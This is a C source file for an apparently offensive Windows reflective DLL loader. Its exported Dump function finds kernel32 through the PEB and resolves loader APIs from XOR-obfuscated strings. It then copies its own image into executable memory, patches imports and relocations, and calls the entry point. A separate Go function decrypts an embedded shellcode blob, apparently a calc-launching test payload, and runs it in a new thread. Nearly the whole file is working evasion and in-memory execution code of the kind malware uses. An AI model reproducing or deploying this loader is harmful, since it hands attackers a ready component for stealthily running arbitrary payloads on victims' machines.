#include <stdio.h>
#include <Windows.h>

#ifdef _M_X64
#include "calc-thread64.bin.inc"
#else
#include "calc-thread32.bin.inc"
#endif

#define UTILS_IMPLEMENTATION
#include "utils.h"

typedef struct _hint_name_table_entry
{
    WORD wHint;
    CHAR sName[1];
} HINT_NAME_TABLE_ENTRY, *PHINT_NAME_TABLE_ENTRY;

#pragma intrinsic(_ReturnAddress)
__declspec(noinline) ULONG_PTR caller(void)
{
    return (ULONG_PTR)_ReturnAddress();
}

__declspec(dllexport) LPVOID Dump(void)
{
    ULONG_PTR ulSrcDLLAddr = caller();

    while (TRUE)
    {
        if (((PIMAGE_DOS_HEADER)ulSrcDLLAddr)->e_magic == IMAGE_DOS_SIGNATURE)
        {
            DWORD dwHeaderValue = ((PIMAGE_DOS_HEADER)ulSrcDLLAddr)->e_lfanew;

            if (dwHeaderValue > sizeof(IMAGE_DOS_HEADER) && dwHeaderValue < 1024)
            {
                if (((PIMAGE_NT_HEADERS)(ulSrcDLLAddr + dwHeaderValue))->Signature == IMAGE_NT_SIGNATURE)
                {
                    break;
                }
            }
        }

        --ulSrcDLLAddr;
    }

    // Get kernel32 base addr from the PEB
    ULONG_PTR hKernelDLL = NULL;

#ifdef _M_X64
    MY_PEB *pPeb = (MY_PEB *)__readgsqword(0x60);
#else
    MY_PEB *pPeb = (MY_PEB *)__readfsdword(0x30);
#endif

    // We do not xor the filename for the sake of simplicity
    char ccKernel32[] = {0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c, 0x0};
    const short ccKernel32Len = 12;

    char cckey[] = {0x30, 0x30, 0x30, 0x30, 0x30, 0};
    const short cckey_len = 5;

    // UnXor kernel32.dll string data
    short j = 0;
    for (short i = 0; i < ccKernel32Len; ++i)
    {
        if (j == cckey_len)
            j = 0;

        BYTE bInput = 0;

        for (BYTE b = 0; b < 8; ++b)
        {
            BYTE data_bit_i = _bittest((LONG *)&ccKernel32[i], b);
            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);

            BYTE bit_xor = (data_bit_i != key_bit_j) << b;

            bInput |= bit_xor;
        }

        ccKernel32[i] = bInput;
        ++j;
    }

    LIST_ENTRY *FirstListEntry = &pPeb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *CurrentListEntry = FirstListEntry->Flink;

    // Look for the loaded kernel32 dll from the table entries
    while (CurrentListEntry != FirstListEntry)
    {
        MY_LDR_DATA_TABLE_ENTRY *TableEntry = (MY_LDR_DATA_TABLE_ENTRY *)((ULONG_PTR)CurrentListEntry - sizeof(LIST_ENTRY));

        // __debugbreak();
        // return TableEntry;

        BOOL bAreEqual = TRUE;

        for (size_t c = 0; c < ccKernel32Len; ++c)
        {
            if (ccKernel32[c] != TableEntry->BaseDllName.Buffer[c])
            {
                if (ccKernel32[c] < TableEntry->BaseDllName.Buffer[c])
                {
                    if ((ccKernel32[c] + 32) != TableEntry->BaseDllName.Buffer[c])
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
                else if (ccKernel32[c] > TableEntry->BaseDllName.Buffer[c])
                {
                    if ((TableEntry->BaseDllName.Buffer[c] + 32) != ccKernel32[c])
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
            }
        }

        if (bAreEqual)
        {
            hKernelDLL = (ULONG_PTR)TableEntry->pvDllBase;
            break;
        }

        CurrentListEntry = CurrentListEntry->Flink;
    }

    if (hKernelDLL == NULL)
    {
        return;
    }

    // Get kernel functions by ordinal
    // Get the loadlibrarya, getprocaddress, virtualalloc addresses from kernel32

    IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)hKernelDLL;
    IMAGE_NT_HEADERS *NTHeaders = (IMAGE_NT_HEADERS *)(hKernelDLL + DosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY ExportDataDirectory = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY *ExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(hKernelDLL + ExportDataDirectory.VirtualAddress);

    DWORD *AddressOfFunctions = (DWORD *)(hKernelDLL + ExportDirectory->AddressOfFunctions);
    DWORD *AddressOfNames = (DWORD *)(hKernelDLL + ExportDirectory->AddressOfNames);
    WORD *AddressOfNameOrdinals = (WORD *)(hKernelDLL + ExportDirectory->AddressOfNameOrdinals);

    FARPROC(WINAPI * ppGetProcAddress)
    (HMODULE hModule, LPCSTR lpProcName) = NULL;
    HMODULE(WINAPI * ppLoadLibraryA)
    (LPCSTR lpLibFileName) = NULL;
    LPVOID(WINAPI * ppVirtualAlloc)
    (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = NULL;

    // Xored data of GetProcAddress function string
    char ccGetProcAddress[] = {0x77, 0x55, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x71, 0x54, 0x54, 0x42, 0x55, 0x43, 0x43, 0};
    const short ccGetProcAddressLen = 14;

    // Un XOR data of the GetProcAddress function string
    j = 0;
    for (short i = 0; i < ccGetProcAddressLen; ++i)
    {
        if (j == cckey_len)
            j = 0;

        BYTE bInput = 0;

        for (BYTE b = 0; b < 8; ++b)
        {
            BYTE data_bit_i = _bittest((LONG *)&ccGetProcAddress[i], b);
            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);

            BYTE bit_xor = (data_bit_i != key_bit_j) << b;

            bInput |= bit_xor;
        }

        ccGetProcAddress[i] = bInput;
        ++j;
    }

    // Look for the GetProcAddress function in the Export Table
    for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
    {
        BOOL bAreEqual = TRUE;

        CHAR *cFuncName = (CHAR *)(hKernelDLL + AddressOfNames[n]);

        for (short c = 0; c < ccGetProcAddressLen; ++c)
        {
            if (ccGetProcAddress[c] != cFuncName[c])
            {
                if (ccGetProcAddress[c] < cFuncName[c])
                {
                    if ((ccGetProcAddress[c] + 32) != cFuncName[c])
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
                else if (ccGetProcAddress[c] > cFuncName[c])
                {
                    if (ccGetProcAddress[c] != (cFuncName[c] + 32))
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
            }
        }

        if (bAreEqual)
        {
            ppGetProcAddress = (FARPROC)(hKernelDLL + AddressOfFunctions[AddressOfNameOrdinals[n]]);
            break;
        }
    }

    // XOR ed data of the LoadLibraryA function string
    char ccLoadLibraryA[] = {0x7c, 0x5f, 0x51, 0x54, 0x7c, 0x59, 0x52, 0x42, 0x51, 0x42, 0x49, 0x71, 0};
    const short ccLoadLibraryALen = 12;

    // Un XOR data of the LoadLibraryA function string
    j = 0;
    for (short i = 0; i < ccLoadLibraryALen; ++i)
    {
        if (j == cckey_len)
            j = 0;

        BYTE bInput = 0;

        for (BYTE b = 0; b < 8; ++b)
        {
            BYTE data_bit_i = _bittest((LONG *)&ccLoadLibraryA[i], b);
            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);

            BYTE bit_xor = (data_bit_i != key_bit_j) << b;

            bInput |= bit_xor;
        }

        ccLoadLibraryA[i] = bInput;
        ++j;
    }

    // Look for the LoadLibrary function in the Export Table
    for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
    {
        BOOL bAreEqual = TRUE;

        CHAR *cFuncName = (CHAR *)(hKernelDLL + AddressOfNames[n]);

        for (short c = 0; c < ccLoadLibraryALen; ++c)
        {
            if (ccLoadLibraryA[c] != cFuncName[c])
            {
                if (ccLoadLibraryA[c] < cFuncName[c])
                {
                    if ((ccLoadLibraryA[c] + 32) != cFuncName[c])
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
                else if (ccLoadLibraryA[c] > cFuncName[c])
                {
                    if (ccLoadLibraryA[c] != (cFuncName[c] + 32))
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
            }
        }

        if (bAreEqual)
        {
            ppLoadLibraryA = (FARPROC)(hKernelDLL + AddressOfFunctions[AddressOfNameOrdinals[n]]);
            break;
        }
    }

    // XOR ed data of the VirtualAlloc function string
    char ccVirtualAlloc[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0};
    const short ccVirtualAllocLen = 12;

    // Un XOR data of the VirtualAlloc function string
    j = 0;
    for (short i = 0; i < ccVirtualAllocLen; ++i)
    {
        if (j == cckey_len)
            j = 0;

        BYTE bInput = 0;

        for (BYTE b = 0; b < 8; ++b)
        {
            BYTE data_bit_i = _bittest((LONG *)&ccVirtualAlloc[i], b);
            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);

            BYTE bit_xor = (data_bit_i != key_bit_j) << b;

            bInput |= bit_xor;
        }

        ccVirtualAlloc[i] = bInput;
        ++j;
    }

    // Look for the VirtualAlloc function in the Export Table
    for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
    {
        BOOL bAreEqual = TRUE;
        CHAR *cFuncName = (CHAR *)(hKernelDLL + AddressOfNames[n]);

        // Get the length of the function name from the export table since we will loop
        // over VirtualAlloc or VirtualAllocEx to cover ccVirtualAlloc
        short cFuncNameLen = 0;
        while (*cFuncName++ != 0)
        {
            ++cFuncNameLen;
        }

        for (short c = 0; c < cFuncNameLen; ++c)
        {
            if (ccVirtualAlloc[c] != cFuncName[c])
            {
                if (ccVirtualAlloc[c] < cFuncName[c])
                {
                    if ((ccVirtualAlloc[c] + 32) != cFuncName[c])
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
                else if (ccVirtualAlloc[c] > cFuncName[c])
                {
                    if (ccVirtualAlloc[c] != (cFuncName[c] + 32))
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
            }
        }

        if (bAreEqual)
        {
            ppVirtualAlloc = (FARPROC)(hKernelDLL + AddressOfFunctions[AddressOfNameOrdinals[n]]);
            break;
        }
    }

    // Copy Section headers
    IMAGE_DOS_HEADER *SrcDosHeader = (IMAGE_DOS_HEADER *)ulSrcDLLAddr;
    IMAGE_NT_HEADERS *SrcNTHeaders = (IMAGE_NT_HEADERS *)(ulSrcDLLAddr + SrcDosHeader->e_lfanew);

    // Allocate space for the "loaded" DLL
    ULONG_PTR ulDstDLLAddr = (ULONG_PTR)ppVirtualAlloc(NULL, SrcNTHeaders->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (ulDstDLLAddr == NULL)
    {
        return;
    }

    for (DWORD dwI = 0; dwI < SrcNTHeaders->OptionalHeader.SizeOfHeaders; ++dwI)
    {
        *(BYTE *)(ulDstDLLAddr + dwI) = *(BYTE *)(ulSrcDLLAddr + dwI);
    }

    // Copy sections (full data)
    ULONG_PTR SrcSectionHeaders = ((ULONG_PTR)&SrcNTHeaders->OptionalHeader + SrcNTHeaders->FileHeader.SizeOfOptionalHeader);
    WORD SrcSectionCount = SrcNTHeaders->FileHeader.NumberOfSections;

    IMAGE_DOS_HEADER *DstDosHeader = (IMAGE_DOS_HEADER *)ulDstDLLAddr;
    IMAGE_NT_HEADERS *DstNTHeaders = (IMAGE_NT_HEADERS *)(ulDstDLLAddr + DstDosHeader->e_lfanew);

    ULONG_PTR DstSectionHeaders = ((ULONG_PTR)&DstNTHeaders->OptionalHeader + DstNTHeaders->FileHeader.SizeOfOptionalHeader);

    for (WORD wS = 0; wS < SrcSectionCount; ++wS)
    {
        PIMAGE_SECTION_HEADER pSrcCurrentSectionHeader = (((PIMAGE_SECTION_HEADER)SrcSectionHeaders) + wS);
        PIMAGE_SECTION_HEADER pDstCurrentSectionHeader = (((PIMAGE_SECTION_HEADER)DstSectionHeaders) + wS);

        ULONG_PTR dwPtrSrcRawData = (ulSrcDLLAddr + pSrcCurrentSectionHeader->PointerToRawData);
        ULONG_PTR dwPtrDstVirtualData = (ulDstDLLAddr + pDstCurrentSectionHeader->VirtualAddress);

        for (DWORD dwS = 0; dwS < pSrcCurrentSectionHeader->SizeOfRawData; ++dwS)
        {
            *(BYTE *)(dwPtrDstVirtualData + dwS) = *(BYTE *)(dwPtrSrcRawData + dwS);
        }
    }

    // Per DLL image descriptor
    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(ulDstDLLAddr + DstNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    DWORD dwImportDescriptorCount = 0;

    while (!(pImageImportDescriptor->OriginalFirstThunk == 0 &&
             pImageImportDescriptor->TimeDateStamp == 0 &&
             pImageImportDescriptor->ForwarderChain == 0 &&
             pImageImportDescriptor->Name == 0 &&
             pImageImportDescriptor->FirstThunk == 0))
    {
        CHAR *sImportName = (CHAR *)(ulDstDLLAddr + pImageImportDescriptor->Name);
        ULONG_PTR hLoadedLibrary = (ULONG_PTR)ppLoadLibraryA(sImportName);

        if (hLoadedLibrary == NULL)
        {
            return;
        }

        // process IAT
        DWORD dwOriginalThunkRVA = pImageImportDescriptor->OriginalFirstThunk;
        DWORD dwFirstThunkRVA = pImageImportDescriptor->FirstThunk;

        DWORD dwHintNameTableEntryRVA = *(DWORD *)(ulDstDLLAddr + dwOriginalThunkRVA);

        PHINT_NAME_TABLE_ENTRY pHintNameTableEntry = (PHINT_NAME_TABLE_ENTRY)(ulDstDLLAddr + *(DWORD *)(ulDstDLLAddr + dwOriginalThunkRVA));

        IMAGE_DOS_HEADER *LoadedLibraryDosHeader = (IMAGE_DOS_HEADER *)hLoadedLibrary;
        IMAGE_NT_HEADERS *LoadedLibraryNTHeaders = (IMAGE_NT_HEADERS *)(hLoadedLibrary + DosHeader->e_lfanew);

        IMAGE_DATA_DIRECTORY LoadedLibraryExportDataDirectory = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        IMAGE_EXPORT_DIRECTORY *LoadedLibraryExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(hLoadedLibrary + ExportDataDirectory.VirtualAddress);

        DWORD *LoadedLibraryAddressOfFunctions = (DWORD *)(hLoadedLibrary + LoadedLibraryExportDirectory->AddressOfFunctions);
        DWORD *LoadedLibraryAddressOfNames = (DWORD *)(hLoadedLibrary + LoadedLibraryExportDirectory->AddressOfNames);
        WORD *LoadedLibraryAddressOfNameOridinals = (WORD *)(hLoadedLibrary + LoadedLibraryExportDirectory->AddressOfNameOrdinals);

        while (dwHintNameTableEntryRVA != 0)
        {
            ULONG_PTR ulProcAddr = ppGetProcAddress((HMODULE)hLoadedLibrary, pHintNameTableEntry->sName);

            *(DWORD64 *)(ulDstDLLAddr + dwFirstThunkRVA) = ulProcAddr;

            dwOriginalThunkRVA += 8;
            dwFirstThunkRVA += 8;

            dwHintNameTableEntryRVA = *(DWORD *)(ulDstDLLAddr + dwOriginalThunkRVA);
            pHintNameTableEntry = (PHINT_NAME_TABLE_ENTRY)(ulDstDLLAddr + dwHintNameTableEntryRVA);
        }

        // Process Base relocation
        PIMAGE_BASE_RELOCATION pImageBaseRelocation = (PIMAGE_BASE_RELOCATION)(ulDstDLLAddr + DstNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        DWORD64 dw64BaseDelta = (DWORD64)ulDstDLLAddr - (DWORD64)DstNTHeaders->OptionalHeader.ImageBase;

        while (pImageBaseRelocation->SizeOfBlock > 0)
        {
            DWORD dwPageRVA = pImageBaseRelocation->VirtualAddress;
            DWORD dwNumberOfEntries = (pImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

            (BYTE *)pImageBaseRelocation += sizeof(IMAGE_BASE_RELOCATION);

            while (dwNumberOfEntries--)
            {
                WORD wEntry = *(WORD *)pImageBaseRelocation;
                if ((wEntry & 0xf000) == 0xa000)
                {
                    WORD wOffsetFromPage = wEntry & 0x0fff;
                    *(DWORD64 *)(ulDstDLLAddr + dwPageRVA + wOffsetFromPage) += dw64BaseDelta;
                }

                (ULONG_PTR) pImageBaseRelocation += sizeof(WORD);
            }
        }

        // Next IMAGE DESCRIPTOR i.e. imported DLL
        (ULONG_PTR) pImageImportDescriptor += sizeof(IMAGE_IMPORT_DESCRIPTOR);
        ++dwImportDescriptorCount;
    }

    char ccNTDLL[] = {0x5e, 0x44, 0x54, 0x5c, 0x5c, 0x1e, 0x54, 0x5c, 0x5c, 0x0};
    const short ccNTDLLLen = 9;

    // UnXor ntdll string data
    j = 0;
    for (short i = 0; i < ccNTDLLLen; ++i)
    {
        if (j == cckey_len)
            j = 0;

        BYTE bInput = 0;

        for (BYTE b = 0; b < 8; ++b)
        {
            BYTE data_bit_i = _bittest((LONG *)&ccNTDLL[i], b);
            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);

            BYTE bit_xor = (data_bit_i != key_bit_j) << b;

            bInput |= bit_xor;
        }

        ccNTDLL[i] = bInput;
        ++j;
    }

    ULONG_PTR hNtdllDLL = (ULONG_PTR)ppLoadLibraryA(ccNTDLL);

    if (hNtdllDLL == NULL)
    {
        return;
    }

    DosHeader = (IMAGE_DOS_HEADER *)hNtdllDLL;
    NTHeaders = (IMAGE_NT_HEADERS *)(hNtdllDLL + DosHeader->e_lfanew);

    ExportDataDirectory = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    ExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(hNtdllDLL + ExportDataDirectory.VirtualAddress);

    AddressOfFunctions = (DWORD *)(hNtdllDLL + ExportDirectory->AddressOfFunctions);
    AddressOfNames = (DWORD *)(hNtdllDLL + ExportDirectory->AddressOfNames);
    AddressOfNameOrdinals = (WORD *)(hNtdllDLL + ExportDirectory->AddressOfNameOrdinals);

    // we split the function name xored data into two buffers, since creating a buffer of more than 15 bytes zero out the data,
    // e.g. creating a buffer of 23 bytes, causes the first 16 bytes being zero.
    // Following is a workaround
    char ccNTFlushInstruc[] = {0x7e, 0x44, 0x76, 0x5c, 0x45, 0x43, 0x58, 0x79, 0x5e, 0x43, 0x44, 0x42, 0x45, 0x53};
    const short ccNTFlushInstrucLen = 14;

    char ccTionCache[] = {0x44, 0x59, 0x5f, 0x5e, 0x73, 0x51, 0x53, 0x58, 0x55, 0};
    const short ccTionCacheLen = 9;

    const short ccNTFlushInstructionCacheLen = ccNTFlushInstrucLen + ccTionCacheLen;

    LONG(NTAPI * ppNTFlushInstructionCache)
    (HANDLE hProcess, PVOID pvBaseAddress, ULONG ulNumberOfBytesToFlush) = NULL;

    CHAR *ccNTFlushInstructionCache = (CHAR *)ppVirtualAlloc(NULL, 23, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (ccNTFlushInstructionCache == NULL)
    {
        return;
    }

    for (short c = 0; c < ccNTFlushInstrucLen; ++c)
    {
        ccNTFlushInstructionCache[c] = ccNTFlushInstruc[c];
    }

    for (short c = ccNTFlushInstrucLen; c < ccNTFlushInstrucLen + ccTionCacheLen; ++c)
    {
        ccNTFlushInstructionCache[c] = ccTionCache[c - ccNTFlushInstrucLen];
    }

    // UnXor NTFlushInstructionCache string
    j = 0;
    for (short i = 0; i < ccNTFlushInstrucLen + ccTionCacheLen; ++i)
    {
        if (j == cckey_len)
            j = 0;

        BYTE bInput = 0;

        for (BYTE b = 0; b < 8; ++b)
        {
            BYTE data_bit_i = _bittest((LONG *)&(ccNTFlushInstructionCache)[i], b);
            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);

            BYTE bit_xor = (data_bit_i != key_bit_j) << b;

            bInput |= bit_xor;
        }

        ccNTFlushInstructionCache[i] = bInput;
        ++j;
    }

    // Look for the NTFlushInstructionCache func in the Export Table
    for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
    {
        BOOL bAreEqual = TRUE;

        CHAR *cFuncName = (CHAR *)(hNtdllDLL + AddressOfNames[n]);

        for (short c = 0; c < ccNTFlushInstructionCacheLen; ++c)
        {
            if (ccNTFlushInstructionCache[c] != cFuncName[c])
            {
                if (ccNTFlushInstructionCache[c] < cFuncName[c])
                {
                    if ((ccNTFlushInstructionCache[c] + 32) != cFuncName[c])
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
                else if (ccNTFlushInstructionCache[c] > cFuncName[c])
                {
                    if (ccNTFlushInstructionCache[c] != (cFuncName[c] + 32))
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
            }
        }

        if (bAreEqual)
        {
            ppNTFlushInstructionCache = (FARPROC)(hNtdllDLL + AddressOfFunctions[AddressOfNameOrdinals[n]]);
            break;
        }
    }

    // Flush the instruction cache
    ppNTFlushInstructionCache((HANDLE)-1, NULL, 0);

    // Find the entry point
    BOOL(WINAPI * pEntryPoint)
    (HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved) = ulDstDLLAddr + DstNTHeaders->OptionalHeader.AddressOfEntryPoint;

    // __debugbreak();

    // Call the entry point
    pEntryPoint((HINSTANCE)ulDstDLLAddr, DLL_PROCESS_ATTACH, NULL);

    return pEntryPoint;
}

void Go(void)
{
    printf("Hello Go\n");
    LPVOID lpvPayload = NULL;

    HMODULE hKernelDLL = MyGetKernelModuleHandle();
    if (hKernelDLL == NULL)
    {
        goto shutdown;
    }

    PopulateKernelFunctionPtrsByName(hKernelDLL);

    char cUser32[] = {0x45, 0x43, 0x55, 0x42, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c, 0};
    const short cUser32Len = 10;
    MyXor(cUser32, cUser32Len, key, key_len);

    HMODULE hUser32 = pLoadLibraryA(cUser32);

    if (hUser32 == NULL)
    {
        return;
    }

    char cMessageBoxA[] = {0x7d, 0x55, 0x43, 0x43, 0x51, 0x57, 0x55, 0x72, 0x5f, 0x48, 0x71, 0};
    const short cMessageBoxALen = 11;
    MyXor(cMessageBoxA, cMessageBoxALen, key, key_len);

    int(WINAPI * pMessageBoxA)(HWND, LPSTR, LPSTR, UINT) = pGetProcAddress(hUser32, cMessageBoxA);
    if (pMessageBoxA == NULL)
    {
        goto shutdown;
    }

    pMessageBoxA(NULL, "Caption", "Text", MB_OK);

#ifdef _M_X64
    lpvPayload = pVirtualAlloc(NULL, calc64_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
#else
    lpvPayload = pVirtualAlloc(NULL, calc32_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
#endif

    if (lpvPayload == NULL)
    {
        goto shutdown;
    }
#ifdef _M_X64
    MyXor(calc64_data, calc64_data_len, key, key_len);
    MyMemCpy(lpvPayload, calc64_data, calc64_data_len);

    DWORD dwOldProtect = 0;
    if (!pVirtualProtect(lpvPayload, calc64_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
    {
        goto shutdown;
    }
#else
    MyXor(calc32_data, calc32_data_len, key, key_len);
    MyMemCpy(lpvPayload, calc32_data, calc32_data_len);

    DWORD dwOldProtect = 0;
    if (!pVirtualProtect(lpvPayload, calc32_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
    {
        goto shutdown;
    }
#endif

    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpvPayload, NULL, 0, NULL);
    if (hThread != NULL)
    {
        pWaitForSingleObject(hThread, INFINITE);
        pCloseHandle(hThread);
    }

shutdown:
    if (lpvPayload != NULL)
    {
        pVirtualFree(lpvPayload, 0, MEM_RELEASE);
    }

    return lpvPayload;
}

BOOL WINAPI DllMain(HINSTANCE hInstanceDLL, DWORD dwReason, LPVOID lpvReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Go();
        break;

    case DLL_PROCESS_DETACH:
        break;

    default:
        break;
    }

    return TRUE;
}